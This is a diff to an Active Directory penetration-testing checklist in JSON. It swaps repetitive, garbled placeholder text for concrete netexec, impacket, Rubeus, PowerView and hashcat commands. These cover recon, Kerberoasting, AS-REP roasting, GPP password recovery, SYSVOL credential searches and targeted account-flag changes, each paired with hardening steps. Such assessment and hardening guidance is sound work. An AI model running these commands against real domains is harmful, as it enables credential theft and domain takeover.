@@ -9,8 +9,8 @@
           "title": "Identify domain controllers and naming contexts",
           "description": "Locate all domain controllers via DNS SRV records (_ldap._tcp.dc._msdcs), LDAP rootDSE, and nltest.",
           "severity": "info",
-          "how_to_find": "Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Locate all domain controllers via DNS SRV records (_ldap._tcp.dc._msdcs), LDAP rootDSE, and nltest",
-          "how_to_fix": "Assign an owner for identify domain controllers and naming contexts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Locate DCs and read the directory naming contexts:\n\n```\nnslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>\nnxc ldap <dc-ip> -u <user> -p <pass> --query \"(objectClass=domain)\" \"\"\nldapsearch -x -H ldap://<dc-ip> -s base namingContexts\n```",
+          "how_to_fix": "Recon step (not a vuln). Defensively: minimize anonymous LDAP exposure, monitor for mass LDAP/SRV enumeration, and segment DCs. Ensure only authenticated, authorized enumeration is possible.",
           "tools": [
             "netexec/crackmapexec",
             "PowerView",
@@ -38,8 +38,8 @@
           "title": "Enumerate users, groups, and computers",
           "description": "Pull the full directory of user accounts, security groups (especially privileged groups like Domain Admins, Enterprise Admins, and protected groups), and computer objects via authenticated or anonymous LDAP.",
           "severity": "low",
-          "how_to_find": "Validate enumerate users, groups, and computers in Enumeration — Domain & Forest Recon. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate users, groups, and computers, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Pull directory objects with valid creds:\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> --users --groups\nnxc smb <dc-ip> -u <user> -p <pass> --users\n# or BloodHound/ldapdomaindump for full detail\n```",
+          "how_to_fix": "Recon step. Defensively: restrict \"Authenticated Users\" read where feasible, remove legacy anonymous access, monitor bulk LDAP queries, and apply least privilege on sensitive OUs/attributes.",
           "tools": [
             "netexec/crackmapexec",
             "PowerView",
@@ -67,8 +67,8 @@
           "title": "Retrieve domain password and lockout policy",
           "description": "Read the domain password policy and any fine-grained password policies (PSOs) to determine minimum length, complexity, lockout threshold, and observation window.",
           "severity": "info",
-          "how_to_find": "Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: Enumeration — Domain & Forest Recon: You know the lockout threshold, lockout duration, observation window, and minimum password length before attempting any guessing",
-          "how_to_fix": "Assign an owner for retrieve domain password and lockout policy, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Read the policy (needed before spraying):\n\n```\nnxc smb <dc-ip> -u <user> -p <pass> --pass-pol\n```",
+          "how_to_fix": "Recon step. Defensively: enforce a strong password policy (length/complexity/banned-password list via Azure AD Password Protection), sensible lockout thresholds, and fine-grained password policies for privileged accounts.",
           "tools": [
             "netexec/crackmapexec",
             "PowerView",
@@ -95,8 +95,8 @@
           "title": "Discover SPNs and service accounts",
           "description": "Enumerate accounts with servicePrincipalName values set.",
           "severity": "low",
-          "how_to_find": "Validate discover spns and service accounts in Enumeration — Domain & Forest Recon. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for discover spns and service accounts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "List accounts with SPNs (Kerberoast targets):\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting out.txt\nGetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip>\n```",
+          "how_to_fix": "Recon step feeding Kerberoasting. Defensively: use gMSA/managed service accounts (128-char random passwords), remove unnecessary SPNs, and require strong passwords on any remaining SPN accounts. See Kerberoasting remediation.",
           "tools": [
             "impacket (GetUserSPNs)",
             "PowerView",
@@ -124,8 +124,8 @@
           "title": "Flag accounts with delegation and risky UAC attributes",
           "description": "Identify accounts trusted for unconstrained/constrained delegation, accounts with DONT_REQUIRE_PREAUTH (AS-REP roastable), disabled-but-present accounts, and accounts with adminCount=1 protected by AdminSDHolder.",
           "severity": "medium",
-          "how_to_find": "Validate flag accounts with delegation and risky uac attributes in Enumeration — Domain & Forest Recon. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for flag accounts with delegation and risky uac attributes, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find delegation + dangerous UAC flags (unconstrained delegation, DONT_REQ_PREAUTH, PASSWD_NOTREQD):\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation --password-not-required\nGet-DomainComputer -Unconstrained | select name   # PowerView\n```",
+          "how_to_fix": "Remove unconstrained delegation (use constrained/RBCD with protocol restrictions), add sensitive accounts to Protected Users / mark \"sensitive & cannot be delegated\", clear `PASSWD_NOTREQD`, and enable pre-auth. Re-audit UAC flags.",
           "tools": [
             "PowerView",
             "impacket (findDelegation)",
@@ -152,8 +152,8 @@
           "title": "Map domain and forest trusts",
           "description": "Enumerate inbound/outbound trusts, trust direction, transitivity, and trust type (parent-child, external, forest).",
           "severity": "medium",
-          "how_to_find": "Validate map domain and forest trusts in Enumeration — Domain & Forest Recon. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for map domain and forest trusts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Enumerate trusts and directions:\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> -M enum_trusts\nnltest /domain_trusts /all_trusts\n```",
+          "how_to_fix": "Recon step. Defensively: enable SID filtering + selective authentication on trusts, remove unnecessary trusts, and treat forest (not domain) as the security boundary. Review trust direction/transitivity.",
           "tools": [
             "PowerView",
             "netexec/crackmapexec",
@@ -186,8 +186,8 @@
           "title": "Run SharpHound/collector across the domain",
           "description": "Collect sessions, ACLs, group memberships, trusts, GPOs, and local admin data using SharpHound (Windows), the Python collector (bloodhound-python), or netexec BloodHound module.",
           "severity": "low",
-          "how_to_find": "Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Validate run sharphound/collector across the domain in Enumeration — BloodHound Attack-Path Analysis",
-          "how_to_fix": "Assign an owner for run sharphound/collector across the domain, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Collect graph data:\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> --bloodhound --collection All --dns-server <dc-ip>\n# or: SharpHound.exe -c All ; bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc-ip>\n```",
+          "how_to_fix": "Recon step. Defensively: run BloodHound yourself to find and cut attack paths, tier admin accounts, monitor for mass LDAP/session enumeration, and reduce excessive rights the collector surfaces.",
           "tools": [
             "SharpHound",
             "BloodHound",
@@ -215,8 +215,8 @@
           "title": "Find shortest paths to Domain Admins",
           "description": "Mark owned principals and run the built-in \"Shortest Paths to Domain Admins from Owned Principals\" query plus high-value target queries to identify the most direct escalation route.",
           "severity": "high",
-          "how_to_find": "Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: Enumeration — BloodHound Attack-Path Analysis: BloodHound returns at least one actionable path (or confirms none) with each edge type understood and exploitable",
-          "how_to_fix": "Assign an owner for find shortest paths to domain admins, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "In BloodHound, mark owned nodes and run \"Shortest Paths to Domain Admins\" / pre-built queries to see escalation routes.",
+          "how_to_fix": "Break the identified paths: remove excessive ACLs, tier administration (separate admin accounts/workstations), reduce local-admin sprawl (LAPS), and add high-value targets to Protected Users. Re-run BloodHound to confirm paths are cut.",
           "tools": [
             "BloodHound",
             "SharpHound"
@@ -242,8 +242,8 @@
           "title": "Analyze dangerous ACL edges",
           "description": "Review GenericAll, GenericWrite, WriteDACL, WriteOwner, AddMember, ForceChangePassword, and AddKeyCredentialLink edges to find abusable object control relationships that BloodHound surfaces as graph edges.",
           "severity": "high",
-          "how_to_find": "Validate analyze dangerous acl edges in Enumeration — BloodHound Attack-Path Analysis. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for analyze dangerous acl edges, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Inspect edges like `GenericAll`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddKeyCredentialLink` toward privileged objects in BloodHound.",
+          "how_to_fix": "Remove/least-privilege the offending ACEs, restore protected-object ACLs (AdminSDHolder/SDProp), and monitor DACL changes on privileged objects. Re-collect to verify edges are gone.",
           "tools": [
             "BloodHound",
             "PowerView",
@@ -270,8 +270,8 @@
           "title": "Hunt with custom Cypher queries",
           "description": "Use custom Cypher queries to surface relationships the default queries miss: kerberoastable users with paths to DA, computers allowing unconstrained delegation, and principals with control over GPOs or OUs.",
           "severity": "medium",
-          "how_to_find": "Validate hunt with custom cypher queries in Enumeration — BloodHound Attack-Path Analysis. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for hunt with custom cypher queries, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Run custom Cypher for org-specific risks, e.g.:\n\n```\nMATCH p=(u:User {enabled:true})-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer) RETURN p LIMIT 25\n```",
+          "how_to_fix": "Use findings to remove risky rights and shrink attack surface. Defensively adopt continuous BloodHound/attack-path monitoring. Re-query after remediation.",
           "tools": [
             "BloodHound"
           ],
@@ -296,8 +296,8 @@
           "title": "Correlate session and local-admin data",
           "description": "Use session and local-admin collection to find where privileged users are logged on, enabling targeted credential theft.",
           "severity": "medium",
-          "how_to_find": "Validate correlate session and local-admin data in Enumeration — BloodHound Attack-Path Analysis. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for correlate session and local-admin data, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Cross-reference where privileged users have sessions vs where you have local admin (derivative-admin paths):\n\n```\nnxc smb <targets> -u <user> -p <pass> --loggedon-users\n```",
+          "how_to_fix": "Reduce local-admin sprawl (LAPS, unique per-host), restrict where privileged accounts log on (tiering, \"Deny logon\" GPOs), and enable Credential Guard so sessions can't be looted. Re-assess derivative paths.",
           "tools": [
             "BloodHound",
             "SharpHound",
@@ -329,8 +329,8 @@
           "title": "Enumerate accessible SMB shares",
           "description": "Spider available SMB shares across hosts with read/write permission mapping.",
           "severity": "low",
-          "how_to_find": "Validate enumerate accessible smb shares in Enumeration — Share & GPP Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate accessible smb shares, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "List and spider shares:\n\n```\nnxc smb <targets> -u <user> -p <pass> --shares\nnxc smb <targets> -u <user> -p <pass> -M spider_plus\n```",
+          "how_to_fix": "Apply least-privilege share + NTFS permissions, remove `Everyone`/`Authenticated Users` from sensitive shares, and audit access. Re-scan with a low-priv account.",
           "tools": [
             "netexec/crackmapexec",
             "smbclient",
@@ -357,8 +357,8 @@
           "title": "Recover GPP cpassword credentials",
           "description": "Search SYSVOL Groups.xml and other Group Policy Preferences files for cpassword fields.",
           "severity": "high",
-          "how_to_find": "Validate recover gpp cpassword credentials in Enumeration — Share & GPP Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for recover gpp cpassword credentials, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find the AES-encrypted (publicly-keyed) GPP passwords in SYSVOL:\n\n```\nnxc smb <dc-ip> -u <user> -p <pass> -M gpp_password\nGet-GPPPassword    # or gpp-decrypt on found cpassword\n```",
+          "how_to_fix": "Remove all GPP files containing `cpassword` from SYSVOL, stop setting passwords via GPP (use LAPS), and rotate any exposed credentials. Re-scan SYSVOL to confirm none remain.",
           "tools": [
             "netexec/crackmapexec",
             "gpp-decrypt",
@@ -385,8 +385,8 @@
           "title": "Mine SYSVOL/NETLOGON logon scripts",
           "description": "Read logon scripts, batch files, and PowerShell in SYSVOL/NETLOGON for hardcoded credentials, mapped-drive passwords, and references to internal hosts and service accounts.",
           "severity": "medium",
-          "how_to_find": "Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Scripts are reviewed and any embedded credentials or sensitive hostnames are extracted and tested",
-          "how_to_fix": "Assign an owner for mine sysvol/netlogon logon scripts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Search logon scripts for hardcoded creds/paths:\n\n```\nnxc smb <dc-ip> -u <user> -p <pass> --share SYSVOL -M spider_plus\ngrep -RniE 'net use|password|/user:' \\\\<dc>\\SYSVOL\n```",
+          "how_to_fix": "Remove credentials from logon scripts, restrict SYSVOL write to admins only, and fetch secrets from a vault at runtime. Rotate exposed creds. Re-scan scripts.",
           "tools": [
             "smbclient",
             "netexec/crackmapexec",
@@ -413,8 +413,8 @@
           "title": "Hunt for secrets in file shares",
           "description": "Search readable shares for files matching credential patterns (passwords, keys, config, unattend.xml, web.config, KeePass databases, .ps1, .vbs) and connection strings.",
           "severity": "medium",
-          "how_to_find": "Validate hunt for secrets in file shares in Enumeration — Share & GPP Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for hunt for secrets in file shares, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Grep shares for passwords, keys, KeePass, config files:\n\n```\nnxc smb <targets> -u <user> -p <pass> -M spider_plus --pattern password key .kdbx web.config\n```",
+          "how_to_fix": "Apply least-privilege ACLs, move secrets to a vault, add DLP/secret scanning on shares, and rotate exposed values. Re-scan.",
           "tools": [
             "netexec/crackmapexec",
             "Snaffler",
@@ -441,8 +441,8 @@
           "title": "Test for null/anonymous SMB and LDAP access",
           "description": "Attempt anonymous SMB session and anonymous LDAP binds to enumerate users, shares, and policy without credentials.",
           "severity": "medium",
-          "how_to_find": "Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Enumeration — Share & GPP Enumeration: Attempt anonymous SMB session and anonymous LDAP binds to enumerate users, shares, and policy without credentials",
-          "how_to_fix": "Assign an owner for test for null/anonymous smb and ldap access, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Attempt unauthenticated access:\n\n```\nnxc smb <dc-ip> -u '' -p '' --shares\nldapsearch -x -H ldap://<dc-ip> -b \"DC=corp,DC=local\"   # anonymous bind\n```",
+          "how_to_fix": "Disable anonymous SMB/LDAP: set `RestrictAnonymous`/`RestrictAnonymousSAM=1`, disable anonymous LDAP binds, and remove null-session shares. Re-test anonymous access fails.",
           "tools": [
             "netexec/crackmapexec",
             "rpcclient",
@@ -475,8 +475,8 @@
           "title": "Enumerate object DACLs across the domain",
           "description": "Read the nTSecurityDescriptor of users, groups, computers, OUs, and GPOs to extract ACEs.",
           "severity": "medium",
-          "how_to_find": "Validate enumerate object dacls across the domain in Enumeration — ACL & ACE Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate object dacls across the domain, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Dump ACLs for analysis:\n\n```\nGet-DomainObjectAcl -ResolveGUIDs -Identity <target>   # PowerView\ndacledit.py -action read -target <object> <domain>/<user>:<pass>\n```",
+          "how_to_fix": "Recon step. Defensively: baseline and monitor DACLs on privileged objects, remove excessive ACEs, and ensure SDProp/AdminSDHolder protects sensitive principals. Re-audit for drift.",
           "tools": [
             "PowerView",
             "BloodHound",
@@ -503,8 +503,8 @@
           "title": "Identify GenericAll/GenericWrite/WriteDACL grants",
           "description": "Find principals holding GenericAll, GenericWrite, WriteDACL, or WriteOwner over high-value objects.",
           "severity": "high",
-          "how_to_find": "Validate identify genericall/genericwrite/writedacl grants in Enumeration — ACL & ACE Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for identify genericall/genericwrite/writedacl grants, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find dangerous rights over privileged objects:\n\n```\nGet-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner'}\n```",
+          "how_to_fix": "Remove excessive rights from non-admins, apply least privilege on OUs/objects, restore protected-object ACLs, and monitor changes. Re-verify with BloodHound.",
           "tools": [
             "PowerView",
             "BloodHound",
@@ -531,8 +531,8 @@
           "title": "Check for DCSync replication rights",
           "description": "Identify non-DC principals granted DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object.",
           "severity": "critical",
-          "how_to_find": "Enumeration — ACL & ACE Enumeration: Enumeration — ACL & ACE Enumeration: Enumeration — ACL & ACE Enumeration: Enumeration — ACL & ACE Enumeration: Validate check for dcsync replication rights in Enumeration — ACL & ACE Enumeration",
-          "how_to_fix": "Assign an owner for check for dcsync replication rights, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find principals with `DS-Replication-Get-Changes(-All)` on the domain head:\n\n```\nGet-DomainObjectAcl \"DC=corp,DC=local\" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get-Changes'}\n```\n\nNon-DC/non-admin principals with these rights = critical.",
+          "how_to_fix": "Remove replication rights from any principal that isn't a DC/authorized admin, monitor DACL changes on the domain object, and alert on DCSync (event 4662 with the replication GUIDs). Re-audit.",
           "tools": [
             "PowerView",
             "BloodHound",
@@ -559,8 +559,8 @@
           "title": "Enumerate LAPS read permissions",
           "description": "Find principals able to read ms-Mcs-AdmPwd (legacy LAPS) or the encrypted LAPS attributes.",
           "severity": "high",
-          "how_to_find": "Validate enumerate laps read permissions in Enumeration — ACL & ACE Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate laps read permissions, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find who can read LAPS passwords (`ms-Mcs-AdmPwd` / `msLAPS-Password`):\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> -M laps\nGet-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd'}\n```",
+          "how_to_fix": "Restrict LAPS read to authorized admins only, tier access, audit reads, and ensure computers can't read their own attribute. Re-audit LAPS ACLs.",
           "tools": [
             "PowerView",
             "netexec/crackmapexec",
@@ -587,8 +587,8 @@
           "title": "Find AddKeyCredentialLink (Shadow Credentials) rights",
           "description": "Identify principals with write access to the msDS-KeyCredentialLink attribute of target objects.",
           "severity": "high",
-          "how_to_find": "Validate find addkeycredentiallink (shadow credentials) rights in Enumeration — ACL & ACE Enumeration. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for find addkeycredentiallink (shadow credentials) rights, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find who can write `msDS-KeyCredentialLink` on targets:\n\n```\nGet-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'Key-Credential-Link|AddKeyCredentialLink'}\n# BloodHound edge: AddKeyCredentialLink\n```",
+          "how_to_fix": "Remove write access to `msDS-KeyCredentialLink` from non-admins, protect privileged objects, and monitor writes to this attribute. Re-audit.",
           "tools": [
             "BloodHound",
             "PowerView",
@@ -621,8 +621,8 @@
           "title": "Request TGS tickets for SPN accounts",
           "description": "Enumerate user accounts with SPNs and request TGS-REP tickets for each.",
           "severity": "high",
-          "how_to_find": "Validate request tgs tickets for spn accounts in Authentication Attacks — Kerberoasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for request tgs tickets for spn accounts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Request service tickets for all SPN accounts:\n\n```\nGetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile kerb.txt\nnxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting kerb.txt\n```",
+          "how_to_fix": "Use gMSA (auto-managed 128-char passwords) for service accounts, remove unnecessary SPNs, enforce long (25+ char) passwords on remaining SPN accounts, and prefer AES over RC4. Monitor 4769 for mass TGS requests. Re-test cracking fails.",
           "tools": [
             "impacket (GetUserSPNs)",
             "Rubeus",
@@ -649,8 +649,8 @@
           "title": "Force RC4 (etype 23) downgrade where possible",
           "description": "Where supported, request tickets with RC4 encryption to obtain faster-cracking hashes.",
           "severity": "medium",
-          "how_to_find": "Validate force rc4 (etype 23) downgrade where possible in Authentication Attacks — Kerberoasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for force rc4 (etype 23) downgrade where possible, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Request RC4 tickets (faster to crack) where allowed:\n\n```\nRubeus.exe kerberoast /rc4opsec /outfile:kerb.txt\n```",
+          "how_to_fix": "Disable RC4 for Kerberos (enforce AES via `msDS-SupportedEncryptionTypes`), monitor for RC4 ticket requests, and use gMSA. Re-verify RC4 is refused.",
           "tools": [
             "Rubeus",
             "impacket (GetUserSPNs)"
@@ -676,8 +676,8 @@
           "title": "Crack TGS hashes offline",
           "description": "Run the extracted krb5tgs hashes against wordlists and rules with hashcat/john.",
           "severity": "high",
-          "how_to_find": "Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Run the extracted krb5tgs hashes against wordlists and rules with hashcat/john",
-          "how_to_fix": "Assign an owner for crack tgs hashes offline, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Crack the roasted hashes:\n\n```\nhashcat -m 13100 kerb.txt rockyou.txt -r best64.rule\n```",
+          "how_to_fix": "Enforce long random service-account passwords / gMSA so offline cracking is infeasible, and rotate any cracked account. Re-attempt cracking to confirm resistance.",
           "tools": [
             "hashcat",
             "john"
@@ -703,8 +703,8 @@
           "title": "Targeted Kerberoasting via writable servicePrincipalName",
           "description": "If you hold write access to a target user, set a temporary SPN on the account, Kerberoast it, then remove the SPN.",
           "severity": "high",
-          "how_to_find": "Validate targeted kerberoasting via writable serviceprincipalname in Authentication Attacks — Kerberoasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for targeted kerberoasting via writable serviceprincipalname, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "If you can write `servicePrincipalName` on a target, set an SPN then roast it:\n\n```\nSet-DomainObject -Identity <victim> -Set @{serviceprincipalname='HTTP/x'}\nGetUserSPNs.py ... -request-user <victim>\n# then remove the SPN\n```",
+          "how_to_fix": "Remove write access to `servicePrincipalName` on user objects from non-admins, and apply the general Kerberoast controls (gMSA, strong passwords, AES). Re-audit write ACLs.",
           "tools": [
             "PowerView",
             "impacket (GetUserSPNs)",
@@ -731,8 +731,8 @@
           "title": "Validate and reuse cracked service credentials",
           "description": "Spray cracked service account passwords across hosts and services, and check group memberships.",
           "severity": "high",
-          "how_to_find": "Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Authentication Attacks — Kerberoasting: Spray cracked service account passwords across hosts and services, and check group memberships",
-          "how_to_fix": "Assign an owner for validate and reuse cracked service credentials, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Verify cracked creds and map their access:\n\n```\nnxc smb <targets> -u <svc> -p <cracked> --shares\n```",
+          "how_to_fix": "Rotate cracked service-account passwords immediately (or migrate to gMSA), review the account's privileges (often over-privileged), and apply least privilege. Re-test the old password fails.",
           "tools": [
             "netexec/crackmapexec",
             "BloodHound"
@@ -763,8 +763,8 @@
           "title": "Enumerate accounts without Kerberos pre-auth",
           "description": "Find users with the DONT_REQ_PREAUTH UAC flag set.",
           "severity": "medium",
-          "how_to_find": "Validate enumerate accounts without kerberos pre-auth in Authentication Attacks — AS-REP Roasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate accounts without kerberos pre-auth, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find `DONT_REQ_PREAUTH` accounts:\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> --asreproast asrep.txt\nGetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass\n```",
+          "how_to_fix": "Enable Kerberos pre-authentication on all accounts (clear `DONT_REQ_PREAUTH`), and enforce strong passwords. Re-audit for accounts without pre-auth.",
           "tools": [
             "impacket (GetNPUsers)",
             "Rubeus",
@@ -792,8 +792,8 @@
           "title": "Request AS-REP hashes",
           "description": "For each preauth-disabled account, request the AS-REP and capture the krb5asrep hash.",
           "severity": "high",
-          "how_to_find": "Validate request as-rep hashes in Authentication Attacks — AS-REP Roasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for request as-rep hashes, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Request the crackable AS-REP for pre-auth-disabled accounts:\n\n```\nGetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -outputfile asrep.txt\n```",
+          "how_to_fix": "Enable pre-auth on the affected accounts and enforce strong passwords. Monitor for AS-REQ without pre-auth. Re-verify AS-REP roasting fails.",
           "tools": [
             "impacket (GetNPUsers)",
             "Rubeus"
@@ -819,8 +819,8 @@
           "title": "Spray AS-REP roast against a username list unauthenticated",
           "description": "Without credentials, supply a username wordlist and query the KDC for AS-REP roastable accounts.",
           "severity": "medium",
-          "how_to_find": "Authentication Attacks — AS-REP Roasting: Authentication Attacks — AS-REP Roasting: Authentication Attacks — AS-REP Roasting: Authentication Attacks — AS-REP Roasting: Authentication Attacks — AS-REP Roasting: Valid usernames are confirmed and any AS-REP roastable accounts among them are captured",
-          "how_to_fix": "Assign an owner for spray as-rep roast against a username list unauthenticated, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "No creds needed — try a username list:\n\n```\nGetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat\n```",
+          "how_to_fix": "Enable pre-auth domain-wide, enforce strong passwords, and monitor for enumeration/AS-REP requests. Re-test with the username list.",
           "tools": [
             "impacket (GetNPUsers)",
             "kerbrute"
@@ -846,8 +846,8 @@
           "title": "Crack AS-REP hashes offline",
           "description": "Crack the krb5asrep hashes with hashcat (mode 18200) or john using wordlists and rules.",
           "severity": "high",
-          "how_to_find": "Validate crack as-rep hashes offline in Authentication Attacks — AS-REP Roasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for crack as-rep hashes offline, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Crack:\n\n```\nhashcat -m 18200 asrep.txt rockyou.txt -r best64.rule\n```",
+          "how_to_fix": "Enforce long passwords so cracking is infeasible and enable pre-auth to remove the primitive entirely. Rotate any cracked account. Re-attempt cracking.",
           "tools": [
             "hashcat",
             "john"
@@ -873,8 +873,8 @@
           "title": "Targeted AS-REP roast via writable userAccountControl",
           "description": "If you can write a target user UAC, set DONT_REQ_PREAUTH, AS-REP roast the account, then revert the flag.",
           "severity": "high",
-          "how_to_find": "Validate targeted as-rep roast via writable useraccountcontrol in Authentication Attacks — AS-REP Roasting. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for targeted as-rep roast via writable useraccountcontrol, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "If you can write `userAccountControl` on a target, toggle DONT_REQ_PREAUTH then roast:\n\n```\nSet-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304}\nGetNPUsers.py ... -request-user <victim>\n```",
+          "how_to_fix": "Remove write access to `userAccountControl` on user objects from non-admins, monitor UAC changes, and enable pre-auth. Re-audit write ACLs.",
           "tools": [
             "PowerView",
             "impacket (GetNPUsers)"
@@ -905,8 +905,8 @@
           "title": "Confirm lockout policy before spraying",
           "description": "Read the domain and any fine-grained lockout policy first.",
           "severity": "info",
-          "how_to_find": "Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Validate confirm lockout policy before spraying in Authentication Attacks — Password Spraying",
-          "how_to_fix": "Assign an owner for confirm lockout policy before spraying, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Read lockout threshold/window first to avoid locking accounts:\n\n```\nnxc smb <dc-ip> -u <user> -p <pass> --pass-pol\n```\n\nKeep attempts safely below the threshold with delays between rounds.",
